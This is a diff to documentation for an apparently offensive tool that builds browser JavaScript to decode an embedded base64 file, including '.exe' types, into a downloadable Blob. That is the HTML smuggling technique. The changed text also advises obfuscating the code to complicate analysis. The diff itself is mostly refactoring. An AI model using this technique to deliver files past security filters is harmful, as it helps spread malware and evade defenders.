@@ -33,19 +33,14 @@ $ python3 dbd.py --extension=".doc" \
 You'll see the generated JavaScript printed to `stdout` with the embedded file contents. Now, you can spend time obfuscating identifier names, string extractions, and code operations to complicate analysis:
 
 ```javascript
+...
+
 class MimeFactory {
   constructor(type) {
-    const mimes = {
-      '.doc': 'application/msword'
-      , '.pdf': 'application/pdf'
-      , '.exe': 'application/octet-stream'
-    , }
-
-    if (!(type in mimes)) {
+    if (!(type in MIMES)) {
       return;
     }
-
-    this.type = mimes[type];
+    this.type = MIMES[type];
   }
 }
 
@@ -54,7 +49,9 @@ class MimeFactory {
     length
   }) => length === 0;
 
-  if (empty(file) || empty(payload)) return;
+  if (empty(file) || empty(payload)) {
+    return;
+  }
 
   const decoded = window.atob(payload);
 
@@ -67,10 +64,9 @@ class MimeFactory {
     bin[i] = decoded.charCodeAt(i);
   }
 
-  const blob = new Blob([bin.buffer]
-    , {
-      type: mime.type
-    });
+  const blob = new Blob([bin.buffer], {
+    type: mime.type
+  });
 
   const url = window.URL.createObjectURL(blob);
 
